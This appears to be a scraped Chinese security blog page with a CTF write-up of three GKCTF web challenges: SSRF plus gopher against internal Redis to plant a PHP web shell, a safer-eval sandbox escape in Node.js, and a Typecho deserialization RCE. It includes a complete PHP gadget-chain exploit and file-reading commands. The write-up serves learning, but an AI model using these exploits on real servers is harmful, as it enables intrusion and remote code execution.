+                                                                                                                                    <img class="hide-in-mobile-device" style="width: 15px;height: 15px;margin-left: 10px;position:relative;top: -3px; vertical-align: middle;content: url('https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png');">
+                                                                                            </span>
+                    <div class="hide-in-mobile-device"
+                         style="padding:6px 12px;; position:absolute;top:90px; right:0px;line-height:40px;overflow:hidden;width:300px;height:40px;">
+                        <div style="background-color:#f2f2f2;transform:skew(30deg);height:45px;width:100%;top:0;right:-30;position:absolute;z-index:0"></div>
+                        <div style="height:40px;width:100%;top:-3px;right:-35px;position:absolute;z-index:0;padding-top: 2px;">
+                            <div class="bdsharebuttonbox" data-tag="share_1"
+                                 style="display:table-cell;vertical-align:midlle;">
+                                        <span style="
+                                                    font-weight: 800;
+                                                    color: #999999;
+                                                ">分享到：</span>
+                                <img data-cmd="qzone" alt="QQ空间"
+                                     src="https://p0.ssl.qhimg.com/sdm/28_28_100/t014ba42aad7714178d.png"/>
+                                <img data-cmd="tsina" alt="新浪微博"
+                                     src="https://p0.ssl.qhimg.com/sdm/28_28_100/t01f0d8694dda79069d.png"/>
+                                <img data-cmd="weixin" alt="微信"
+                                     src="https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png"/>
+                                <img data-cmd="sqq" alt="QQ"
+                                     src="https://p0.ssl.qhimg.com/sdm/28_28_100/t010d95bee6ba3edf60.png"/>
+                                <img data-cmd="fbook" alt="facebook"
+                                     src="https://p0.ssl.qhimg.com/sdm/28_28_100/t01a5e75c16cffcb0ba.png"/>
+                                <img data-cmd="twi" alt="twitter"
+                                     src="https://p0.ssl.qhimg.com/sdm/28_28_100/t01fc30c819f51e9cff.png"/>
+                            </div>
+                        </div>
+                    </div>
+                    </p>
+                    <time class="article-date">发布时间：2020-06-29 15:29:36</time>
+                                                            <div class="article-content">
+                        <html>
+<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head>
+<body>
+<p id="h1-u6B63u8A00"><img class="alignnone size-full wp-image-209349 aligncenter" alt="" width="299" height="201" data-original="https://p4.ssl.qhimg.com/t0118aa83bfa2870503.png"></p>
+<p> </p>
+<h2 name="h2-0" id="h2-0">GKCTF EZ三剑客-EzWeb</h2>
+<p>看到这个题前端和我自己出的一个题实在是很像，同样是输入一个url，先看题目长啥样吧。</p>
+<p><img class="aligncenter" alt="在这里插入图片描述" data-original="https://img-blog.csdnimg.cn/20200623132703691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NyaXNwcng=,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p>嗯，啥也没有，输入url基本没反应，<code>F12</code>给的提示是<code>?secret</code>，输入后发现：</p>
+<p><img class="aligncenter" alt="在这里插入图片描述" data-original="https://img-blog.csdnimg.cn/20200623132842706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NyaXNwcng=,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p>这就很敏感了，相当于一个</p>
+<pre><code class="lang-bash">   ifconfig
+</code></pre>
+<p>的命令，这个时候应该是SSRF打内网，看内网的存活主机有多少，直接burp抓个包爆破一下有新发现：</p>
+<p><img class="aligncenter" alt="在这里插入图片描述" data-original="https://img-blog.csdnimg.cn/20200623133155643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NyaXNwcng=,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p>这个IP的其他端口有问题？不多说，nmap一把梭看看有哪些常见==问题端口== 很骚的一个点就是nmap如果不强调<code>-p-</code>参数`或者指定端口貌似不会扫<code>6379</code> 端口的，也就是<code>redis</code> 端口，而这个无疑是问题端口中的问题端口，因此可以指定扫<code>6379端口</code>：</p>
+<p><img class="aligncenter" alt="" data-original="https://p1.ssl.qhimg.com/t0163c68e4cdb820063.png"></p>
+<p>下面其实就很明了了，redis未授权访问嘛，但是是内网啊，你咋访问？结合url，其实就知道是通过gopher协议来动手脚，gopher打Mysql和redis网上很多分析文章，这里简单说一下原理。</p>
+<p> </p>
+<h2 name="h2-1" id="h2-1">gopher攻击redis原理</h2>
+<p>先得从==RESP==协议开始</p>
+<p>Redis服务器与客户端通过RESP（REdis Serialization Protocol）协议通信。</p>
+<p><strong>RESP协议</strong>是在<code>Redis 1.2</code>中引入的，但它成为了与Redis 2.0中的Redis服务器通信的标准方式。这是您应该在Redis客户端中实现的协议。</p>
+<p>RESP实际上是一个支持以下数据类型的序列化协议：简单字符串，错误，整数，批量字符串和数组。</p>
+<p>RESP在Redis中用作请求 – 响应协议的方式如下：</p>
+<blockquote>
+<p>客户端将命令作为Bulk Strings的RESP数组发送到Redis服务器。<br>
+服务器根据命令实现回复一种RESP类型。</p>
+<p>在RESP中，某些数据的类型取决于第一个字节：<br>
+对于Simple Strings，回复的第一个字节是+<br>
+对于error，回复的第一个字节是-<br>
+对于Integer，回复的第一个字节是:<br>
+对于Bulk Strings，回复的第一个字节是$<br>
+对于array，回复的第一个字节是*</p>
+</blockquote>
+<p>此外，RESP能够使用稍后指定的Bulk Strings或Array的特殊变体来表示Null值。<br>
+在RESP中，协议的不同部分始终以”rn”(CRLF)结束。</p>
+<p>用tcpdump抓包分析一下，<code>redis</code>客户端执行以下命令：</p>
+<pre><code class="lang-bash">set name test
+    &gt;OK
+    get name
+    &gt;"test"
+</code></pre>
+<p><img class="aligncenter" alt="" data-original="https://p2.ssl.qhimg.com/t0155b02b11247e2712.png"></p>
+<p>客户端向将命令作为<code>Bulk String</code>的RESP数组发送到Redis服务器，然后服务器根据命令实现回复给客户端一种RESP类型。</p>
+<p>我们就拿上面的数据包分析，首先是<code>*3</code>，代表数组的长度为3（可以简单理解为用空格为分隔符将命令分割为<code>([“set”,”name”,”test”]）；</code> <code>$4</code>代表字符串的长度，<code>0d0a</code>即rn表示结束符；<code>+OK</code>表示服务端执行成功后返回的字符串</p>
+<p>那么攻击的原理也就是利用<code>gopher</code>来生成一个符合<code>redis RESP协议</code>的payload，这里推荐使用<code>Gopherus</code>这款工具，可以直接构造mysql、redis等gopher的payload。</p>
+<pre><code class="lang-bash">python Gopherus.py --exploit --redis #指定是redis
+</code></pre>
+<p><img class="aligncenter" alt="" data-original="https://p4.ssl.qhimg.com/t015454d212d1991879.png"></p>
+<p>直接把payload放到之前的url框中，然后在访问shell.php</p>
+<blockquote><p>注意：ip应为内网存在redis服务的ip,而并非现在这个开放80端口的机子ip，访问的时候也是访问前者的ip/shell.php文件</p></blockquote>
+<p><img class="aligncenter" alt="" data-original="https://p5.ssl.qhimg.com/t01ca03e31eed27cfd2.png"></p>
+<p>然后直接在构造一个<code>echo system("cat /flag")</code>写入指定php中即可</p>
+<p><img class="aligncenter" alt="" data-original="https://p5.ssl.qhimg.com/t0136bcb5dabbee0b82.png"></p>
+<p>然后访问存在redis主机的ip/shell.php：</p>
+<p><img class="aligncenter" alt="" data-original="https://p1.ssl.qhimg.com/t016ea5f4cf1627d641.png"></p>
+<p> </p>
+<h2 name="h2-2" id="h2-2">GKCTF EZ三剑客-Eznode</h2>
+<p>看到这个题发现是一个Nodejs写的，并且使用的是express框架，题目给了源码，这里贴一下(省略了无关紧要的路由部分，加上了代码注释)：</p>
+<pre><code class="lang-nodejs">const express = require('express'); //用的是express框架
+const bodyParser = require('body-parser');
+
+const saferEval = require('safer-eval'); // 2019.7/WORKER1 找到一个很棒的库
+
+const fs = require('fs');
+
+const app = express();
+
+
+app.use(bodyParser.urlencoded({ extended: false }));
+app.use(bodyParser.json());
+
+// 2020.1/WORKER2 老板说为了后期方便优化
+app.use((req, res, next) =&gt; {  //在/eval路由中，设置了delay默认是60000
+  if (req.path === '/eval') {
+    let delay = 60 * 1000;
+    console.log(delay);
+    if (Number.isInteger(parseInt(req.query.delay))) { 
+    //将get请求的delay返回整数后判断是否为整数
+      delay = Math.max(delay, parseInt(req.query.delay));
+    //选取默认的delay值和传参的delay值的最大值
+    }
+    const t = setTimeout(() =&gt; next(), delay);
+    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事
+    setTimeout(() =&gt; {
+      clearTimeout(t);
+      console.log('timeout');
+      try {
+        res.send('Timeout!');
+      } catch (e) {
+
+      }
+    }, 1000);
+  } else {
+    next();
+  }
+});
+
+app.post('/eval', function (req, res) {
+  let response = '';
+  if (req.body.e) {
+    try {
+      response = saferEval(req.body.e);
+    } catch (e) {
+      response = 'Wrong Wrong Wrong!!!!';
+    }
+  }
+  res.send(String(response));
+});
+</code></pre>
+<p><code>const saferEval = require('safer-eval')</code>nodejs的题在ha1cyon出现了几次，一般涉及到nodejs的题就是沙箱逃逸，而导致能够沙箱逃逸的，通常都是库的问题，题目有特地强调了这个<code>safer-eval</code>的库，直接去<strong>github</strong>找<strong>issues</strong></p>
+<p><img class="aligncenter" alt="" data-original="https://p3.ssl.qhimg.com/t01963324b4c4298672.png"></p>
+<p>人证物证时间证都在，应该就是这个点了，花点功夫看下逻辑是啥，这里直接把代码内容放在注释中。最关键的点仔细谈一谈：</p>
+<p> </p>
+<h2 name="h2-3" id="h2-3">setTimeout的分析</h2>
+<blockquote><p>setTimeout，第一个参数为回调函数，第二个参数表示从当前时刻开始过多少毫秒后开始执行回调函数</p></blockquote>
+<pre><code> setTimeout(() =&gt; {handler }, time); //在{handler}中执行你的方法，time是过多久执行
+</code></pre>
+<p>我们举个例子</p>
+<pre><code class="lang-nodejs"> (function test() {
+    var timer = setTimeout(function (name) {
+        console.log('hello', name)
+    }, 3000, 'Micheal')
+});
+// 如果设定了clearTimeout，将不再执行setTimeout中的回调函数，参数值为setTimeout函数返回的定时器对象
+(function test() {
+    var timer = setTimeout(function (name) {
+        console.log('hello', name)
+    }, 3000, 'Micheal')
+    clearTimeout(timer)  //在3秒之内已经执行了clear，因此不会调用回调函数
+});
+</code></pre>
+<p>所以我们结合来看</p>
+<pre><code> setTimeout(() =&gt; {
+      clearTimeout(t);
+      console.log('timeout');
+      try {
+        res.send('Timeout!');
+      } catch (e) {
+
+      }
+    }, 1000);
+  } else {
+    next();
+  }
+});
+</code></pre>
+<p>进入<code>eval</code>需要至少6秒，而在1秒内便会<code>clearTimeout(t)</code>使得无法进入下一个eval路由,我们如果能进入调用<code>eval</code>的方法，那么通过<code>req.body.e</code>结合沙箱溢出便能RCE。</p>
+<p><img class="aligncenter" alt="" data-original="https://p5.ssl.qhimg.com/t01f0b1170bdd295a8f.png"></p>
+<p>当我们传入的delay大于该值时，delay会变为1，那么就是说在1毫秒时调用回调函数，快于1秒时进行clearTimeout(t)，因此再结合沙箱溢出的<code>payload</code>可以成功进行RCE。</p>
+<p><img class="aligncenter" alt="" data-original="https://p4.ssl.qhimg.com/t013a1c2286abee0691.png"></p>
+<p> </p>
+<h2 name="h2-4" id="h2-4">EZ三剑客-EzTypecho</h2>
+<p>这个题已经出现过加强版的了，在MRCTF里出现过typecho反序列化利用PHP原生类Soapclient打SSRF的题，这里对比了一下原始版本的typecho反序列化漏洞，发现构造的payoad几乎一眼，这里就跟着链子走一路：</p>
+<p><img class="aligncenter" alt="" data-original="https://p5.ssl.qhimg.com/t0102baeb9de2847f6a.png"></p>
+<p>当设置了<code>session</code>后，会对<code>Typecho_Cookie::get('__typecho_config')</code>base64解码后反序列化，先回溯一下：</p>
+<p><img class="aligncenter" alt="" data-original="https://p4.ssl.qhimg.com/t01754b3227abbf3d7e.png"></p>
+<p>可以看到这一段是可控的，得到<code>$config</code>后便其传入<code>Typecho_Db</code>中，跟进看看</p>
+<p><img class="aligncenter" alt="" data-original="https://p1.ssl.qhimg.com/t014e339b5a03540c72.png"></p>
+<p>发现是将这个参数当成字符串拼接了，那么如果这个<code>$config['adapter']</code>是一个其他类，并且该类有<code>toString</code>方法，就可以触发魔术方法，全局搜索一下：</p>
+<p><img class="aligncenter" alt="" data-original="https://p4.ssl.qhimg.com/t01aa4c1cd4a7990c80.png"></p>
+<p>在Typecho_Feed类中找到标记的语句，还有出题人的提示QAQ,这里调用了<code>$item['author']-&gt;screenName</code>，如果该类是一个不能存在screenName属性的类的话，那么这里就会调用这个类的<code>__get()魔术方法</code>，在<strong>Request.php</strong>中发现了这么一个魔术方法，</p>
+<p><img class="aligncenter" alt="" data-original="https://p4.ssl.qhimg.com/t0195dfff63a6ba7f83.png"></p>
+<p>这里的<strong>$key</strong>就是<code>"screenName"</code>,继续跟进<code>get()</code>方法</p>
+<p><img class="aligncenter" alt="" data-original="https://p1.ssl.qhimg.com/t01cd69225f4c34dd79.png"></p>
+<p><code>$value</code>可控，直接跟进到这个方法：</p>
+<p><img class="aligncenter" alt="" data-original="https://p5.ssl.qhimg.com/t018865edb439318748.png"></p>
+<p>链子到这里基本结束了，这里调用了<code>call_user_func</code>，而两个参数都是我们可控的，所以直接就能够RCE。<br>
+贴下exp：</p>
+<pre><code class="lang-PHP">&lt;?php
+$cmd = 'system("ls")';
+
+class Typecho_Feed
+{
+        const RSS2 = 'RSS 2.0';
+        const ATOM1 = 'ATOM 1.0';
+
+        private $_type;
+        private $_items;
+
+        public function __construct() {
+                //$this-&gt;_type = $this::RSS2;
+
+                $this-&gt;_type = $this::ATOM1;
+                $this-&gt;_items[0] = array(
+                        'category' =&gt; array(new Typecho_Request()),
+                        'author' =&gt; new Typecho_Request(),
+                );
+        }
+}
+
+class Typecho_Request
+{
+        private $_params = array();
+        private $_filter = array();
+
+        public function __construct() {
+                $this-&gt;_params['screenName'] = $GLOBALS[cmd];
+                $this-&gt;_filter[0] = 'assert';
+        }
+}
+
+$exp = array(
+        'adapter' =&gt; new Typecho_Feed(),
+        'prefix'  =&gt; 'typecho_'
+);
+
+echo base64_encode(serialize($exp));
+?&gt;
+</code></pre>
+<p>生成payload之后再来触发反序列化条件，但是这个题并没有看到<code>session_start()</code>，貌似只能找找其他触发点了：</p>
+<p><img class="aligncenter" alt="" data-original="https://p3.ssl.qhimg.com/t01f4db0b9f7b8a35dd.png"></p>
+<p>finish参数由于没有session已经被阻挡了</p>
+<p>如果有<code>start</code>参数，并且Referer设置为本站时，可以触发反序列化操作，进行RCE</p>
+<p><img class="aligncenter" alt="" data-original="https://p4.ssl.qhimg.com/t01c6f46f6dd00636a6.png"></p>
+<p> </p>
+<h2 name="h2-5" id="h2-5">总结</h2>
+<p>总的来说，做的这三个EZ题目难度没有特别大，但是出的质量也还挺好的，也是强化了一些思维，比如针对<strong>url想到CRLF或者SSRF探测内网</strong>，nodejs题目多往沙箱逃逸方向思考，善于利用Github等等，总而言之，对自己而言收获还是很大的</p>
+</body>
+</html>
+                    </div>
+                    <section class="article-footer-label">
+                        <div>
+                                                         <div>
+                                 本文由<b>Crispr</b>原创发布
+                                <br>转载，请参考<a href="/note/repost" target="_blank">转载声明</a>，注明出处：
+                                <a href="/post/id/209117"
+                                   target="_blank">https://www.anquanke.com/post/id/209117</a>
+                                <br>安全客 - 有思想的安全新媒体
+                            </div>
+                                                     </div>
+                    </section>
+                    <section style="margin-top:18px;">
+                                                    <a class="article-tag-primary" href="/tag/CTF" target="_blank">CTF</a>                     </section>
+                    <section style="text-align:center;margin-top:40px;" class="hide-in-mobile-device">
+                        <button onclick="likePost()" class="btn btn-primary btn-lg btn-like"
+                                 style="min-width:100px;">
+                            <i class="fa fa-thumbs-o-up" aria-hidden="true" style="margin-right:10px;"></i>
+                                                            <span id="like_status">赞</span> <span id="like_count_area"> (
+                                    <span
+                                            id="like_count">5</span>)</span>
+                                                    </button>
+                        <button class="btn btn-danger btn-lg btn-favorite" style="min-width:100px;"
+                                onclick="favorite();">
+                            <i class="fa fa-heart" aria-hidden="true" style="margin-right:10px;"></i>收藏
+                        </button>
+                    </section>
+                    <section class="hide-in-mobile-device"
+                             style="text-align:center;margin-top:40px;border-top:1px #f7f7f7 solid;position:relative;line-height:40px;">
+                        <div style="float:left;height:80px;line-height:80px;">
+                            <a rel="noopener noreferrer" target="_blank" href="/member/148472"
+                               style="color:#333333">
+                                <div>
+                                    <div class="avatar"
+                                         style="background-image: url(https://p4.ssl.qhimg.com/sdm/40_40_100/t01f727a088f341ab8f.png);height:28px;width:28px;margin-top:28px;float:left;"></div>
+                                    <div style="float:left;margin-left:5px;">
+                                        <nobr>
+                                                <span class="">Crispr</span>                                             <span class="user_label verify_label">认证</span>                                         </nobr>
+                                    </div>
+                                </div>
+                            </a>
+                        </div>
+                        <div class="bdsharebuttonbox" data-tag="share_1"
+                             style="display:table-cell;vertical-align:midlle;float:right;margin-top:20px;">
+                            <span style="font-weight: 800;color: #999999;">分享到：</span>
+                            <img data-cmd="qzone" alt="QQ空间"
+                                 src="https://p0.ssl.qhimg.com/sdm/28_28_100/t014ba42aad7714178d.png"/>
+                            <img data-cmd="tsina" alt="新浪微博"
+                                 src="https://p0.ssl.qhimg.com/sdm/28_28_100/t01f0d8694dda79069d.png"/>
+                            <img data-cmd="weixin" alt="微信"
+                                 src="https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png"/>
+                            <img data-cmd="sqq" alt="QQ"
+                                 src="https://p0.ssl.qhimg.com/sdm/28_28_100/t010d95bee6ba3edf60.png"/>
+                            <img data-cmd="fbook" alt="facebook"
+                                 src="https://p0.ssl.qhimg.com/sdm/28_28_100/t01a5e75c16cffcb0ba.png"/>
+                            <img data-cmd="twi" alt="twitter"
+                                 src="https://p0.ssl.qhimg.com/sdm/28_28_100/t01fc30c819f51e9cff.png"/>
+                        </div>
+                    </section>
+                    <div>
+                    </div>
+                </div>
+                <section style="margin-top:20px;" class="hide-in-mobile-device">
+                    <div style="font-weight:bolder;position:relative;font-size:18px;">
+                        <span style="color:#1dada7;font-weight:900;margin-right:6px;">|</span>推荐阅读
+                        <div style="position:absolute;right:18px;top:14px;font-size:14px;">
+                        </div>
+                    </div>
+                    <div class="row">
+                                                    <div class="col col-6" style="padding:6px;">
+                                <a href="/post/id/272572">
+                                    <img src="https://p4.ssl.qhimg.com/sdm/229_160_100/t0116c2f55a0a747cd8.jpg"
+                                         class="rounded" style="width:100%;">
+                                    <h6 style="margin-top:5px;width:100%;height: 40px;overflow: hidden">疑似蔓灵花APT组织伪装多国身份攻击孟加拉国</h6>
+                                    <time style="color:#999999">2022-04-26 14:30:00</time>
+                                </a>
+                            </div>
+                                                    <div class="col col-6" style="padding:6px;">
+                                <a href="/post/id/272528">
+                                    <img src="https://p2.ssl.qhimg.com/sdm/229_160_100/t0193c2e2f63ad2d862.jpg"
+                                         class="rounded" style="width:100%;">
+                                    <h6 style="margin-top:5px;width:100%;height: 40px;overflow: hidden">Go template 遇上 yaml 反序列化 CVE-2022-21701 分析</h6>
+                                    <time style="color:#999999">2022-04-26 10:30:01</time>
+                                </a>
+                            </div>
+                                                    <div class="col col-6" style="padding:6px;">
+                                <a href="/post/id/272473">
+                                    <img src="https://p2.ssl.qhimg.com/sdm/229_160_100/t016d75759f6f8b8594.jpg"
+                                         class="rounded" style="width:100%;">
+                                    <h6 style="margin-top:5px;width:100%;height: 40px;overflow: hidden">欧盟协调漏洞披露政策</h6>
+                                    <time style="color:#999999">2022-04-25 14:30:28</time>
+                                </a>
+                            </div>
+                                                    <div class="col col-6" style="padding:6px;">
+                                <a href="/post/id/272460">
+                                    <img src="https://p2.ssl.qhimg.com/sdm/229_160_100/t01daf72c0697555d95.png"
+                                         class="rounded" style="width:100%;">
+                                    <h6 style="margin-top:5px;width:100%;height: 40px;overflow: hidden">物联网终端安全入门与实践之了解物联网终端 下篇</h6>
+                                    <time style="color:#999999">2022-04-25 10:30:39</time>
+                                </a>
+                            </div>
+                                            </div>
+                </section>
+                <div style="width:100%;" class="comment-area" id="comment">
+                    <section style="margin-top:20px;">
+                        <div style="font-weight:bolder;position:relative;font-size:18px;">
+                            <span style="color:#1dada7;font-weight:900;margin-right:6px;">|</span>发表评论
+                        </div>
+                        <div class="comment-box">
+                            <textarea id="comment-content" placeholder="发表你的评论吧"></textarea>
+                            <div class="bottom-area">
+                                <div style="float:left;" class="comment-login hide-in-mobile-device">
+                                    <div style="float:left;height:28px;line-height:28px;margin-top: 2px;margin-left: 6px;">
+                                        <a rel="noopener noreferrer" target="_blank"
+                                           href="/member/148472"
+                                           style="color:#333333">
+                                            <div>
+                                                <div class="avatar"
+                                                     style="height:28px;width:28px;float:left;"></div>
+                                                <div style="float:left;margin-left:5px;">
+                                                    <nobr>
+                                                        <span class="nickname">
+                                                        </span>
+                                                    </nobr>
+                                                </div>
+                                            </div>
+                                        </a>
+                                    </div>
+                                </div>
+                                <div style="float:right;">
+                                    <button class="btn btn-primary btn-sm" onclick="comment(false);">发表评论</button>
+                                </div>
+                            </div>
+                        </div>
+                    </section>
+                    <section style="margin-top:40px;">
+                        <div style="font-weight:bolder;position:relative;font-size:18px;">
+                            <span style="color:#1dada7;font-weight:900;margin-right:6px;">|</span>评论列表
+                        </div>
+                        <div style="width:100%;line-height:180px;text-align:center;color:#999999;font-size:15px;display:none;"
+                             id="comment-empty">
+                            还没有评论呢，快去抢个沙发吧~
+                        </div>
+                        <ul style="padding:0px ;margin-top:20px;" id="comment-list">
+                        </ul>
+                        <div id="loadButton"
+                             style="width:100%;background-color:#e2e2e2;border-radius:4px;text-align:center;padding:7px;margin-top:20px;color:#666666;cursor:pointer;"
+                             onclick="loadComment(false);">加载更多
+                        </div>
+                    </section>
+                </div>
+            </div>
+            <!-- 侧边栏 -->
+            <div class="col col-xs-0 col-sm-0 col-md-0 col-lg-6 hide-in-mobile-device">
+                <div class="sidebar">
+                    <div class="article-detail-user-box box-shadow" style="background-color: white">
+                        <div>
+                            <div class="row">
+                                <div class="col col-24">
+                                    <div style="background-image:url('https://p2.ssl.qhimg.com/sdm/290_80_100/t018dfe370b0cb43fb0.png');margin-top:-12px;height: 80px;margin-left:-12px;margin-right:-12px;background-position: center;background-size: cover;"></div>
+                                    <a rel="noopener noreferrer" target="_blank" href="/member/148472">
+                                        <div class="avatar"
+                                             style="box-shadow:2px 5px 17px #eee;background-color:white;background-image: url(https://p4.ssl.qhimg.com/sdm/200_200_100/t01f727a088f341ab8f.png);z-index: 4;margin-top: -40px;"></div>
+                                    </a>
+                                </div>
+                                <div class="col col-24">
+                                    <div class="user-info" style="text-align: center;margin-left: 0;">
+                                        <a rel="noopener noreferrer" target="_blank"
+                                           href="/member/148472">
+                                            <div class="name" style="display:table-cell;vertical-align:middle;">
+                                                <span style="display:table-cell;vertical-align:middle;"><span
+                                                            style="vertical-align:middle;">Crispr</span>
+<img class="user-label user-label-verify"/>
+                                                        </span>
+                                            </div>
+                                        </a>
+                                        <div class="slogan">blog:crisprx.top</div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="bottom-info">
+                                <div class="bottom-info-left">
+                                    <div class="info-block">
+                                        <div class="key">文章</div>
+                                        <div class="value">19</div>
+                                    </div>
+                                    <div class="info-block">
+                                        <div class="key">粉丝</div>
+                                        <div class="value">41</div>
+                                    </div>
+                                </div>
+                                <div class="bottom-info-right">
+                                    <div class="info-block" style="width: auto; padding: 10px;">
+                                        <div>
+                                            <button type="button" style="display: none;"
+                                                    class="btn btn-outline-primary btn-sm follow-button">
+                                                <i class="fa fa-plus" style="margin-right:3px;"></i>
+                                                <span>关注</span>
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <h2>TA的文章</h2>
+                                                            <div class="post-item">
+                                    <div class="title">
+                                        <a href="/post/id/267345">从学习Windows PEB到Hell&#039;s Gate</a>
+                                    </div>
+                                    <div class="date">2022-02-10 14:30:31</div>
+                                </div>
+                                                            <div class="post-item">
+                                    <div class="title">
+                                        <a href="/post/id/265090">对Cobalt Strike进行一点二次开发</a>
+                                    </div>
+                                    <div class="date">2022-01-14 10:30:13</div>
+                                </div>
+                                                            <div class="post-item">
+                                    <div class="title">
+                                        <a href="/post/id/264890">一些绕过AV进行UserAdd的方法总结及实现</a>
+                                    </div>
+                                    <div class="date">2022-01-12 10:30:09</div>
+                                </div>
+                                                            <div class="post-item">
+                                    <div class="title">
+                                        <a href="/post/id/262666">CS shellcode内存加载器免杀及实现</a>
+                                    </div>
+                                    <div class="date">2021-12-16 14:30:41</div>
+                                </div>
+                                                            <div class="post-item">
+                                    <div class="title">
+                                        <a href="/post/id/254904">PrintSpoofer提权原理探究</a>
+                                    </div>
+                                    <div class="date">2021-10-19 10:00:17</div>
+                                </div>
+                                                    </div>
+                    </div>
+                    <div class="input-group mb-3" style="margin-top:14px;">
+                        <div class="input-group-prepend">
+                                <span class="input-group-text" style="background-color:white;color:#1dada7"
+                                      id="basic-addon1">
+                                    <i class="fa fa-search" aria-hidden="true"></i>
+                                </span>
+                        </div>
+                        <input type="text" class="form-control search-input" placeholder="输入关键字搜索内容" aria-label="search"
+                               aria-describedby="basic-addon1">
+                    </div>
+                    <div class="meta-box">
+                        <h3 class="meta-box-title">相关文章</h3>
+                        <div style="padding:8px;">
+                            <ul class="similar—article-list">
+                                                                    <li>
+                                        <a href="/post/id/270917" target="_blank" rel="noopener noreferrer">
+                                            ctf中 linux 内核态的漏洞挖掘与利用系列</a>
+                                    </li>
+                                                                    <li>
+                                        <a href="/post/id/270520" target="_blank" rel="noopener noreferrer">
+                                            活动 | *CTF 2022 ，04月16日，高能开赛！</a>
+                                    </li>
+                                                                    <li>
+                                        <a href="/post/id/270248" target="_blank" rel="noopener noreferrer">
+                                            CTF真题php在多重限制下的情况下如何执行命令？</a>
+                                    </li>
+                                                                    <li>
+                                        <a href="/post/id/267031" target="_blank" rel="noopener noreferrer">
+                                            2022DASCTF一月赛部分题解</a>
+                                    </li>
+                                                                    <li>
+                                        <a href="/post/id/267233" target="_blank" rel="noopener noreferrer">
+                                            Realworld CTF 2022 - RWDN 复现解析</a>
+                                    </li>
+                                                                    <li>
+                                        <a href="/post/id/267183" target="_blank" rel="noopener noreferrer">
+                                            Real World CTF Trust or Not Wp</a>
+                                    </li>
+                                                                    <li>
+                                        <a href="/post/id/267228" target="_blank" rel="noopener noreferrer">
+                                            春秋杯秋季赛“PWN梦空间” | 设计思路与解析</a>
+                                    </li>
+                                                            </ul>
+                        </div>
+                    </div>
+                    <div class="card hot-recommand">
+                        <div class="card-header">
+                            热门推荐
+                        </div>
+                        <div class="card-body">
+                            <div class="home-block-info">
+                                <a rel="noopener noreferrer" href="/post/id/162175" target="_blank">
+                                    <div class="block-info-item"
+                                         style="margin-left: 0px; height: 195px; margin-top: 0px; background:url(https://p4.ssl.qhimg.com/t0103c09221eaa4f35b.png) repeat scroll center center / cover; overflow: hidden; width: 100%;">
+                                        <div class="block-info-item-bg"
+                                             style="width: 100%;background-color:transparent;">
+                                                                                    </div>
+                                    </div>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                                            <div class="article-index">
+                            <h5>文章目录</h5>
+                            <nav id="article-index" class="navbar navbar-light">
+                                <nav class="nav nav-pills ">
+                                                                            <a class="nav-link" href="#h2-0">GKCTF EZ三剑客-EzWeb</a>                                          <a class="nav-link" href="#h2-1">gopher攻击redis原理</a>                                          <a class="nav-link" href="#h2-2">GKCTF EZ三剑客-Eznode</a>                                          <a class="nav-link" href="#h2-3">setTimeout的分析</a>                                          <a class="nav-link" href="#h2-4">EZ三剑客-EzTypecho</a>                                          <a class="nav-link" href="#h2-5">总结</a>                                  </nav>
+                            </nav>
+                        </div>
+                                    </div>
+            </div>
+        </div>
+    </div>
+    <link href="https://lib.baomitu.com/highlight.js/9.12.0/styles/github.min.css" rel="stylesheet">
+<script src="https://lib.baomitu.com/highlight.js/9.12.0/highlight.min.js"></script>    <script>
+        $(function () {
+            $("img").lazyload({
+                effect: "fadeIn"
+            });
+            $(".lazy").lazyload({
+                effect: "fadeIn"
+            });
+        });
+        $(".article-index").sticky({
+            topSpacing: 60
+        });
+        hljs.initHighlighting();
+    </script>
+</main>
+<script>
+    $(document).ready(function () {
+        $(".article-index").mCustomScrollbar({
+            theme: "minimal-dark"
+        });
+        loadComment(true);
+        getRandomNickname(false);
+        var desc = "https://p4.ssl.qhimg.com/t0118aa83bfa2870503.png";
+        window._bd_share_config = {
+            share: [{
+                bdText: "GKCTF EZWEB的分析题解和思考",
+                bdDesc: desc.replace(/[&\|\\\*^%$#@\-]/g, ""),
+                bdUrl: window.location.href,
+                bdPic: "https://p4.ssl.qhimg.com/t0118aa83bfa2870503.png",
+                tag: "share_1"
+            }]
+        };
+        with (document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement(
+            'script')).src =
+            'https://static.anquanke.com/bdshare/static/api/js/share.js?cdnversion=' + ~(-new Date() /
+            36e5)];
+    });
+    $(window).scroll(function () {
+        var top1 = $('#comment-list').offset().top;
+        var gun = $(document).scrollTop();
+        var top = top1 - gun;
+        if (top <= 700) {
+            $('.article-index').fadeOut();
+        } else {
+            $('.article-index').fadeIn();
+        }
+    });
+    var post_id = "209117"; //文章id
+    var user_id = "148472"; //作者用户id
+
+    var post_favorite = false;
+    var next = "";
+    var comments = [];
+    axios.get(api("user/favorite?target_post_id=" + post_id)).then(function (res) {
+        if (res.data.success) {
+            swtichFavorite(res.data.data.favorite);
+            post_favorite = res.data.data.favorite;
+        }
+    });
+
+    function swtichFavorite(favorite) {
+        if (favorite) {
+            $(".btn-favorite").html('<i class="fa fa-heart" aria-hidden="true" style="margin-right:10px;"></i>已收藏');
+        }
+        else {
+            $(".btn-favorite").html('<i class="fa fa-heart" aria-hidden="true" style="margin-right:10px;"></i>收藏');
+        }
+    }
+
+    function favorite() {
+        if (getLocalUserInfo().isLogin) {
+            post_favorite = !post_favorite;
